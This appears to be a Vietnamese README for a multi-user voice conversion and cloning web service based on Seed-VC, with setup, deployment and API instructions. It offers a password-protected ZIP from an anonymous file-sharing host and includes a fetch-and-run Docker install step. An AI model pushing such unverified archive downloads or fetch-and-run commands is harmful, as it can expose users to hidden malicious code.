# 🎭 Seed-VC CPU Multi-User - Hệ Thống Chuyển Đổi & Nhân Bản Giọng Nói

[![Vietnamese](https://img.shields.io/badge/Language-100%25%20Tiếng%20Việt-blue.svg)](https://github.com/tivi99035-ux/thu-wuan-ao)
[![Multi-User](https://img.shields.io/badge/Multi--User-50--100+%20Users-green.svg)](https://github.com/tivi99035-ux/thu-wuan-ao)
[![CPU Optimized](https://img.shields.io/badge/CPU-Optimized-orange.svg)](https://github.com/tivi99035-ux/thu-wuan-ao)
[![Docker](https://img.shields.io/badge/Docker-Production%20Ready-blue.svg)](https://github.com/tivi99035-ux/thu-wuan-ao)

## 🌟 Tổng Quan

Hệ thống chuyển đổi và nhân bản giọng nói dựa trên **Seed-VC** được tối ưu hoàn toàn cho:
- **🏗️ Multi-User**: Hỗ trợ 50-100+ người dùng đồng thời
- **🎭 Voice Cloning**: Nhân bản giọng nói AI từ mẫu tham khảo
- **💻 CPU Optimized**: Chạy hiệu quả trên VPS Ubuntu 22.04 không GPU
- **🌐 100% Tiếng Việt**: Giao diện và documentation hoàn toàn bằng tiếng Việt

## 📥 Tải Về Project

### Option 1: GitHub Clone
```bash
git clone https://github.com/tivi99035-ux/thu-wuan-ao.git
cd thu-wuan-ao
```

### Option 2: ZIP File với Mật Khẩu (All-in-One)
🔗 **Download Link**: [https://bashupload.com/_wwPK/68iD0.zip](https://bashupload.com/_wwPK/68iD0.zip)
🔐 **Password**: `369852`

```bash
wget https://bashupload.com/_wwPK/68iD0.zip
unzip -P 369852 68iD0.zip
cd seed-vc-cpu-multiuser/
```

## 🚀 Triển Khai Nhanh

### Triển Khai Multi-User cho 50 người dùng đồng thời:
```bash
# 1. Cài đặt hệ thống
chmod +x scripts/setup.sh
./scripts/setup.sh

# 2. Triển khai multi-user với Docker
chmod +x scripts/deploy-multiuser.sh
./scripts/deploy-multiuser.sh docker 3 50

# 3. Truy cập
# Frontend: http://your-vps-ip
# Monitoring: http://your-vps-ip:8404
```

## 🎯 Tính Năng Chính

### 🎭 **Voice Processing**
- **Chuyển Đổi Giọng Nói**: 3 models (Base, Fast, Hi-Fi)
- **Nhân Bản Giọng Nói AI**: Clone từ reference audio
- **Audio Recording**: Ghi âm trực tiếp từ web
- **Multiple Formats**: Support WAV, MP3, FLAC, M4A

### 🏗️ **Multi-User Architecture**
- **Load Balancing**: HAProxy với multiple instances
- **Redis Clustering**: Distributed caching & sessions
- **Worker Pools**: Concurrent audio processing
- **WebSocket Real-time**: Live progress updates
- **Rate Limiting**: Security và resource protection

### 📊 **Monitoring & Analytics**
- **System Dashboard**: CPU/RAM/Worker monitoring
- **Performance Metrics**: Throughput & latency tracking
- **User Analytics**: Connection stats & usage patterns
- **Health Checks**: Auto service monitoring

## 📈 Khả Năng Xử Lý

| VPS Configuration | Concurrent Users | Command |
|-------------------|------------------|---------|
| 4 CPU, 8GB RAM | 10-20 người | `./scripts/deploy-multiuser.sh systemd 2 20` |
| 8 CPU, 16GB RAM | 30-50 người | `./scripts/deploy-multiuser.sh docker 3 50` |
| 16 CPU, 32GB RAM | 50-100 người | `./scripts/deploy-multiuser.sh docker 4 100` |
| 32+ CPU, 64GB+ RAM | 100+ người | `./scripts/deploy-multiuser.sh docker 6 200` |

## 🛠️ Tech Stack

### Frontend
- **Framework**: Next.js 15 + TypeScript
- **UI**: shadcn/ui + Tailwind CSS
- **Real-time**: WebSocket client
- **Audio**: WebAudio API cho recording/playback

### Backend  
- **API**: FastAPI + Python 3.9
- **Processing**: ONNX Runtime (CPU-optimized)
- **Queue**: Redis + Background tasks
- **Workers**: Multi-process pools

### Infrastructure
- **Load Balancer**: HAProxy
- **Reverse Proxy**: Nginx
- **Containerization**: Docker + Docker Compose
- **Monitoring**: Prometheus + Grafana
- **Cache**: Redis Cluster

## 📚 Documentation

- **[README.md](README.md)**: Hướng dẫn cài đặt chi tiết
- **[MULTI_USER_GUIDE.md](MULTI_USER_GUIDE.md)**: Hướng dẫn triển khai đa người dùng
- **[scripts/](scripts/)**: Automated deployment scripts
- **[docker/](docker/)**: Docker configurations
- **[monitoring/](monitoring/)**: Monitoring setup

## 🔧 Cài Đặt Chi Tiết

### Yêu Cầu Hệ Thống
- **OS**: Ubuntu 22.04 LTS
- **CPU**: 4+ cores (8+ cho multi-user)
- **RAM**: 8GB+ (16GB+ cho multi-user)
- **Disk**: 50GB+ available

### Cài Đặt Dependencies
```bash
# Ubuntu 22.04
sudo apt update && sudo apt upgrade -y
sudo apt install -y build-essential curl git ffmpeg sox python3.9 nodejs npm

# Install pnpm
npm install -g pnpm

# Install Docker (optional)
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
```

### Cài Đặt Project
```bash
# Clone và setup
git clone https://github.com/tivi99035-ux/thu-wuan-ao.git
cd thu-wuan-ao

# Frontend dependencies
pnpm install

# Backend dependencies
python3.9 -m venv venv
source venv/bin/activate
pip install -r backend/requirements.txt

# Build
pnpm run build
```

## 🎮 Sử Dụng

### Giao Diện Web
1. **Chuyển Đổi Giọng Nói**:
   - Upload file âm thanh
   - Chọn model và target voice
   - Điều chỉnh settings
   - Download kết quả

2. **Nhân Bản Giọng Nói**:
   - Upload giọng tham khảo  
   - Upload nội dung cần convert
   - Điều chỉnh độ tương đồng
   - Download voice cloned

### API Usage
```bash
# Voice Conversion
curl -X POST "http://your-server/api/convert" \
  -F "audio_file=@input.wav" \
  -F "model_id=seed-vc-fast" \
  -F "target_speaker=speaker_001"

# Voice Cloning
curl -X POST "http://your-server/api/clone" \
  -F "reference_file=@reference.wav" \
  -F "target_file=@content.wav" \
  -F "similarity_threshold=0.8"
```

## 🔍 Monitoring

### Built-in Monitoring
- **System Monitor**: Real-time dashboard trong web UI
- **HAProxy Stats**: `http://your-server:8404`
- **Health Check**: `http://your-server/health`

### Command Line Monitoring
```bash
# System monitoring
./monitor_multiuser.sh

# Service status
systemctl status seed-vc-*

# Logs
tail -f logs/*.log
```

## 🌟 So Sánh Với Mã Gốc

| Feature | Original Seed-VC | Implementation Này |
|---------|------------------|-------------------|
| **Interface** | CLI only | 🌐 Modern Web UI |
| **Users** | Single user | 👥 50-100+ concurrent |
| **Voice Cloning** | ✅ CLI | 🎨 Web UI + Enhanced |
| **Language** | English | 🇻🇳 100% Tiếng Việt |
| **Deployment** | Manual | 🐳 Docker + Auto scripts |
| **Monitoring** | Basic logs | 📊 Real-time dashboard |
| **Scalability** | No | ⚡ Auto-scaling |

## 🤝 Contributing

1. Fork repository
2. Tạo feature branch
3. Commit changes
4. Push và tạo Pull Request

## 📄 License

MIT License - Xem [LICENSE](LICENSE) file

## 🙏 Acknowledgments

- [Seed-VC](https://github.com/Plachta/Seed-VC) - Original implementation
- [FastAPI](https://fastapi.tiangolo.com/) - Web framework
- [Next.js](https://nextjs.org/) - Frontend framework
- [ONNX Runtime](https://onnxruntime.ai/) - CPU optimization

---

**🎉 Hệ thống sẵn sàng phục vụ nhiều người dùng đồng thời trên Ubuntu VPS!**

🔗 **GitHub**: https://github.com/tivi99035-ux/thu-wuan-ao
📦 **Download**: https://bashupload.com/_wwPK/68iD0.zip (Password: 369852)